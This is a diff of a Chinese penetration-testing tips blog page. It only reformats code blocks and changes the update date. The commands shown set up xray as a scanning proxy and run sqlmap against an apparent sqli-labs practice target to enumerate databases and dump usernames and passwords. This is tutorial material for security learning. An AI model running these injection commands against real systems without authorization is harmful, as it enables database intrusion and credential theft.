@@ -458,7 +458,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-07-28
+                    2022-08-14
                 </div>
                 
 
@@ -502,7 +502,7 @@
 <p>xray最主要的就是和Burpsuit联动</p>
 </blockquote>
 <h4 id="首先生成证书"><a href="#首先生成证书" class="headerlink" title="首先生成证书"></a><strong>首先生成证书</strong></h4><p>xray所在目录下，打开cmd，输入</p>
-<pre class="line-numbers language-none"><code class="language-none">.\xray_windows_amd64.exe genca<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">.<span class="token punctuation">\</span>xray_windows_amd64.exe genca<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>在当前目录下会生成有一个证书，然后导入到Firefox浏览器中</p>
 <p>打开设置，搜索证书</p>
@@ -511,7 +511,7 @@
 <p>直接导入</p>
 <p><img src="/2022/04/03/shen-tou-xiao-tips-yi/image-20220404220639192.png"></p>
 <h4 id="开启xray监听"><a href="#开启xray监听" class="headerlink" title="开启xray监听"></a>开启xray监听</h4><p>cmd下输入</p>
-<pre class="line-numbers language-none"><code class="language-none">.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">.<span class="token punctuation">\</span>xray_windows_amd64.exe webscan --listen <span class="token number">127.0</span>.0.1:7777 --html-output proxy.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这个表示监听127.0.0.1的7777端口并将扫描结果生成proxy.html文件在当前目录下</p>
 <p>xray定义了如下几种输出方式：</p>
@@ -536,27 +536,27 @@
 <ul>
 <li>sqlmap -u 网址 –dbs：爆所有数据库信息</li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http://82.157.179.125:8032/Less-1/?id=1 --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -u http://82.157.179.125:8032/Less-1/?id<span class="token operator">=</span><span class="token number">1</span> --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <img src="image-20220404224347361.png" style="zoom:80%;">
 
 <ul>
 <li>sqlmap -u 网址 -D security –tables ：查看security里有多少张表</li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http://82.157.179.125:8032/Less-1/?id=1 -D security --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -u http://82.157.179.125:8032/Less-1/?id<span class="token operator">=</span><span class="token number">1</span> -D security --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <img src="image-20220404224330960.png" style="zoom:80%;">
 
 <ul>
 <li>sqlmap -u 网址 -D security -T users –columns：查看security中users这张表有多少列</li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http://82.157.179.125:8032/Less-1/?id=1 -D security -T users --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -u http://82.157.179.125:8032/Less-1/?id<span class="token operator">=</span><span class="token number">1</span> -D security -T <span class="token function">users</span> --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/04/03/shen-tou-xiao-tips-yi/image-20220404224739334.png"></p>
 <ul>
 <li>sqlmap -u 网址 -D security -T users -C username,password –dump ：取出security里的用户名和密码，dump取的意思</li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http://82.157.179.125:8032/Less-1/?id=1 -D security -T users -C username,password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -u http://82.157.179.125:8032/Less-1/?id<span class="token operator">=</span><span class="token number">1</span> -D security -T <span class="token function">users</span> -C username,password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <img src="image-20220404224856912.png" style="zoom: 67%;">
 
@@ -564,7 +564,7 @@
 <li>报错注入：sqlmap -u 网址 –current-db –batch(忽略一些错误)  –threads 10 –technique E</li>
 </ul>
 <p>命令输入：</p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http://82.157.179.125:8032/Less-5/?id=123 --current-db --batch --threads 10 --technique E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -u http://82.157.179.125:8032/Less-5/?id<span class="token operator">=</span><span class="token number">123</span> --current-db --batch --threads <span class="token number">10</span> --technique E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>成功查到</p>
 <img src="image-20220404231723263.png" alt="image-20220404231723263" style="zoom:33%;">
@@ -577,7 +577,7 @@
 <img src="image-20220404231049389.png" alt="image-20220404231049389" style="zoom: 25%;">
 
 <p>命令输入：</p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -r "/root/test.txt" --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -r <span class="token string">"/root/test.txt"</span> --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
